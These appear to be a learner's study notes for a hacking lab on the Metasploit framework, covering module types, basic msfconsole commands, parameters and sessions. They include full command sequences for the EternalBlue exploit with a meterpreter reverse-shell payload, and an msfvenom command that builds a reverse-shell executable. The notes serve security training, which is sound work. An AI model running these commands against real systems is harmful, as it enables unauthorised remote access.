# Metasploit Notes 

## 🔹 What is Metasploit?
Metasploit is the most popular exploitation framework.  
It is used by **penetration testers, security researchers, and ethical hackers** for tasks like:
- Information gathering  
- Scanning  
- Exploitation (attacking vulnerable systems)  
- Post-exploitation (work after getting access)  
- Exploit development (writing new exploits)  



## 🔹 Versions of Metasploit
Metasploit comes in two versions:

| Version              | Type        | Features                                                                 |
|----------------------|------------|-------------------------------------------------------------------------|
| **Metasploit Pro**   | Commercial | GUI-based (Graphical Interface), automation, reporting, task management |
| **Metasploit Framework** | Open-source | CLI-based (Command Line), widely used in Linux for penetration testing  |

👉 In hacking labs (like **AttackBox, Kali Linux, Parrot OS**), we mostly use **Metasploit Framework**.



## 🔹 Components of Metasploit Framework
Metasploit is divided into **3 main components**:

### 1. msfconsole
The main **command-line interface (CLI)** of Metasploit.  

**Example: Starting Metasploit**
``` bash
msfconsole
```


### 2. Modules
Modules are like **building blocks** of Metasploit.  
They are scripts written to perform specific actions.

| Module Type | Purpose |
|-------------|---------|
| **Exploits** | Code that takes advantage of a vulnerability (e.g., attack Windows SMB bug) |
| **Payloads** | Code that runs after exploit (e.g., reverse shell, meterpreter) |
| **Scanners** | Used for scanning targets (e.g., open ports, services) |
| **Auxiliary** | Extra tools (e.g., fuzzers, DoS attacks, sniffers) |

👉 Example: Searching for SMB exploits
``` bash
search smb
```
👉 Example: Using an exploit
``` bash
use exploit/windows/smb/ms17_010_eternalblue
```
👉 Example: Setting target IP
``` bash
set RHOSTS 192.168.1.10
```


### 3. Tools
Metasploit also provides **standalone tools** for specific tasks.  

| Tool | Purpose |
|------|---------|
| **msfvenom** | Create custom payloads (like malicious .exe, .apk, .elf) |
| **pattern_create** | Helps in exploit development (creates patterns for buffer overflow testing) |
| **pattern_offset** | Finds exact memory offset in buffer overflow attacks |

👉 Example: Generate a Windows reverse shell payload with msfvenom
``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > shell.exe
```


## 🔹 Workflow of Metasploit (Step-by-step)
1. **Information Gathering** → Collect data about target  
2. **Scanning** → Find open ports, services, vulnerabilities  
3. **Exploitation** → Use exploit module to attack target  
4. **Payload Execution** → Get shell / meterpreter session  
5. **Post-Exploitation** → Privilege escalation, data extraction  
6. **Reporting / Cleanup**  



## 🔹 Example Scenario (EternalBlue Exploit)

**Start Metasploit**
``` bash
msfconsole
```
**Search exploit**
``` bash
search ms17_010
```
**Use exploit**
``` bash
use exploit/windows/smb/ms17_010_eternalblue
```
**Set target IP**
``` bash
set RHOSTS 192.168.1.20
```
**Set payload**
``` bash
set PAYLOAD windows/meterpreter/reverse_tcp
```
**Set attacker IP**
``` bash
set LHOST 192.168.1.5
```
**Run exploit**
``` bash
exploit
```
👉 If successful, you will get a **meterpreter session** (remote shell on victim).
---
# Metasploit Modules 

## 🔹 Console (msfconsole)
- **msfconsole** is the main interface of Metasploit.
- You launch it from terminal using:
msfconsole
- It is used to interact with **modules** (small components that perform specific tasks like exploit, scan, brute-force).



## 🔹 Key Concepts
| Term          | Meaning |
|---------------|---------|
| **Vulnerability** | A flaw in design, code, or logic of a system. Exploiting it may leak data or allow remote code execution. |
| **Exploit** | A piece of code that **uses the vulnerability** to attack the target system. |
| **Payload** | The code that runs after successful exploitation (e.g., reverse shell, run calc.exe). |

👉 Example flow:  
``` bash
- Vulnerability found → Exploit it → Run Payload → Gain Access
```


## 🔹 Module Categories

### 1. Auxiliary
- **Support modules**: scanners, crawlers, fuzzers, etc.  
- Example: port scanner, SQLi scanner, sniffers.  
- Directory structure:
``` bash
auxiliary/
├── admin
├── analyze
├── crawler
├── dos
├── fuzzers
├── gather
├── scanner
├── sniffer
├── spoof
├── sqli
└── voip
```


### 2. Encoders
- Encoders **hide exploit/payload** by encoding it.  
- Goal → trick **signature-based antivirus** (AV compares files to a known threat database).  
- But: **limited success** because AVs use advanced detection.
``` bash
encoders/
├── cmd
├── generic
├── php
├── ruby
├── x64
└── x86
```


### 3. Evasion
- **Direct attempt to bypass antivirus or security solutions.**  
- More effective than encoders, but not 100% guarantee.  
``` bash
evasion/
└── windows
├── applocker_evasion_install_util.rb
├── applocker_evasion_msbuild.rb
├── process_herpaderping.rb
├── syscall_inject.rb
├── windows_defender_exe.rb
└── windows_defender_js_hta.rb
```


### 4. Exploits
- **Core of Metasploit** → contains exploit code organized by operating system.  
- Example: EternalBlue (Windows SMB exploit).  
``` bash
exploits/
├── android
├── apple_ios
├── firefox
├── linux
├── multi
├── unix
└── windows
```


### 5. NOPs (No Operation)
- Do **nothing** (just 1 CPU cycle).  
- Used as **buffers** to adjust payload sizes.  
- Intel x86 opcode: `0x90`.
``` bash
nops/
├── armle
├── php
├── sparc
├── x64
└── x86
```


### 6. Payloads
- Code that runs on the **target system**.  
- Exploit = open the door 🔓  
- Payload = what you do after entering 🛠️  

Payload types:
| Type        | Description |
|-------------|-------------|
| **Adapters** | Wraps payload into another format (e.g., PowerShell). |
| **Singles** | Self-contained (e.g., launch notepad.exe, add user). |
| **Stagers** | Small loader to connect back to attacker & download larger payload. |
| **Stages** | Main part of staged payload, downloaded after stager runs. |

👉 Naming difference:
- **Single (inline) payload:**
``` bash
generic/shell_reverse_tcp
```
- **Staged payload:**
``` bash  
windows/x64/shell/reverse_tcp
```


### 7. Post
- Used in **post-exploitation phase** (after gaining access).  
- Examples: privilege escalation, keylogging, data gathering.  
``` bash
post/
├── android
├── hardware
├── linux
├── multi
├── networking
└── windows
```


## 🔹 Summary Table

| Module Type  | Purpose |
|--------------|---------|
| **Auxiliary** | Scanners, crawlers, fuzzers, sniffers |
| **Encoders** | Encode payload to try to bypass AV |
| **Evasion** | Advanced AV evasion modules |
| **Exploits** | Actual attack code for vulnerabilities |
| **NOPs** | Padding to adjust payload size |
| **Payloads** | Code executed after exploit (shells, backdoors) |
| **Post** | Post-exploitation modules (privilege escalation, gathering data) |

---

## 🔹 Example (Payload Execution)
- Exploit SMB vulnerability on Windows  
- Use a **reverse TCP shell payload**  
``` bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.20
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit
```
👉 Result: **Meterpreter session** → remote shell on victim system.

---
# Metasploit Basics Commands 

## 1. Starting Metasploit Console
- Main interface of Metasploit = `msfconsole`
- Run it on terminal:
``` bash 
msfconsole
```
- Once it starts, prompt will look like:
``` bash 
msf6 >
```
(version can be `msf5` or `msf6` depending on installation)



## 2. Running Linux Commands inside Metasploit
- You can run many Linux commands directly inside Metasploit.
- Example:
``` bash 
msf6 > ls
```
This shows current folder files.

- Example of ping:
``` bash 
msf6 > ping -c 1 8.8.8.8
```
→ Sends only 1 ping to Google DNS server (8.8.8.8).  

⚠️ Note: Some Linux features (like output redirection `>`) don’t work inside msfconsole.



## 3. Help Command
- To get help for any command:
``` bash 
msf6 > help
msf6 > help set
```


## 4. History of Commands
- To check what commands you typed before:
``` bash 
msf6 > history
```


## 5. Tab Completion
- If you type partial command and press **Tab**, Metasploit will auto-complete.
- Example: typing `he` + Tab → becomes `help`.



## 6. Context in Metasploit
- Context = the module you are currently using.
- Example:
``` bash 
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```
Prompt changes to:
``` bash
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```
- If you set options in one module (like `RHOSTS`) and then change to another module, settings are lost unless set globally.



## 7. Show Options
- Shows required/optional settings for current module.
``` bash 
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```
- Example output includes:
  - RHOSTS → Target host IP(s)
  - RPORT → Target port (default 445 for SMB)
  - LHOST, LPORT → Local attacker’s IP and port



## 8. Show Payloads
- Shows all payloads compatible with current exploit.
``` bash 
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
```


## 9. Back Command
- To exit from current context:
``` bash 
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 >
```


## 10. Info Command
- To get detailed information about a module:
``` bash 
msf6 exploit(windows/smb/ms17_010_eternalblue) > info
```
- Shows: Name, Author, Description, References, Targets supported, Options needed, etc.



## 11. Search Command
- One of the most useful commands.
- Example searches:
``` bash 
msf6 > search ms17-010
msf6 > search type:auxiliary telnet
```
- Output shows:
   - Module type (exploit/auxiliary/etc.)
    - Disclosure Date
   - Rank (reliability of exploit)
   - Check (whether exploit has check option)
   - Description



## 12. Exploit Ranking (Reliability Levels)
| Rank        | Meaning                                              |
|-------------|------------------------------------------------------|
| Excellent   | Almost always works without crashing target          |
| Great       | Reliable in most cases                               |
| Good        | Generally works but may fail sometimes               |
| Normal      | Works but target crash possible                      |
| Average     | Medium reliability, may fail often                   |
| Low         | Rarely works, may crash system                       |
| Manual      | Needs manual setup, not reliable                     |

---

## 13. Example Workflow (EternalBlue Exploit)
1. Search for exploit:
``` bash
search ms17-010
```
2. Use exploit:
``` bash
use exploit/windows/smb/ms17_010_eternalblue
```
3. Show options:
``` bash
show options
```
4. Set required values:
``` bash
set RHOSTS <target-ip>
set LHOST <your-ip>
```
5. Run exploit:
``` bash 
run
```


# Key Takeaways
- **msfconsole** = main interface
- **Context matters** → each module has its own options
- **search** = to find modules
- **use** = to select module
- **show options** = see required parameters
- **set** = configure parameters
- **run** = execute exploit
---
# Other Commands

## 1. Different Prompts in Metasploit

Metasploit has 5 main prompts:

| Prompt Type             | Example                                                    | Meaning |
|--------------------------|------------------------------------------------------------|---------|
| Regular Linux Prompt     | root@ip-10-10-XX-XX:~#                                    | Normal Linux terminal, Metasploit commands will not work here |
| Metasploit Prompt        | msf6 >                                                    | Base Metasploit console, no module selected yet |
| Module Context Prompt    | msf6 exploit(windows/smb/ms17_010_eternalblue) >          | Inside a specific exploit module, parameters can be set here |
| Meterpreter Prompt       | meterpreter >                                             | Exploit success → target system Meterpreter shell obtained |
| Target System Shell      | C:\Windows\system32>                                      | Direct command shell on the target system |



## 2. Show Options & Set Parameters

To see all available parameters:
``` bash
show options
```
Example:
``` bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```
To set parameters:
``` bash
set RHOSTS 10.10.165.39
set LHOST 10.10.44.70
set LPORT 4444
```
Verify parameters:
``` bash
show options
```


## 3. Important Parameters

- **RHOSTS** → Target IP address (or a range)  
- **RPORT** → Target port (default 445 for SMB)  
- **LHOST** → Your attack machine IP  
- **LPORT** → Listening port on your machine (any free port, e.g., 4444)  
- **PAYLOAD** → The payload used with the exploit (e.g., reverse shell)  



## 4. Unset / Global Set

Unset a parameter:
``` bash
unset RHOSTS
unset all
```
Set globally (works across all modules):
``` bash
setg RHOSTS 10.10.165.39
unsetg RHOSTS
```


## 5. Running Exploits

Run normally:
``` bash
exploit
```
Run and background the session:
``` bash
exploit -z
```


## 6. Sessions

List active sessions:
``` bash
sessions
```
Interact with a session:
``` bash
sessions -i 1
```
Background a session:
``` bash
background
(or `CTRL+Z`)
```


## 7. Example Flow – EternalBlue Exploit
``` bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.44.70
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
```
If successful, you will see:
``` bash
[*] Meterpreter session 1 opened ...
meterpreter >
```
Now you have full access to the target system 🚀
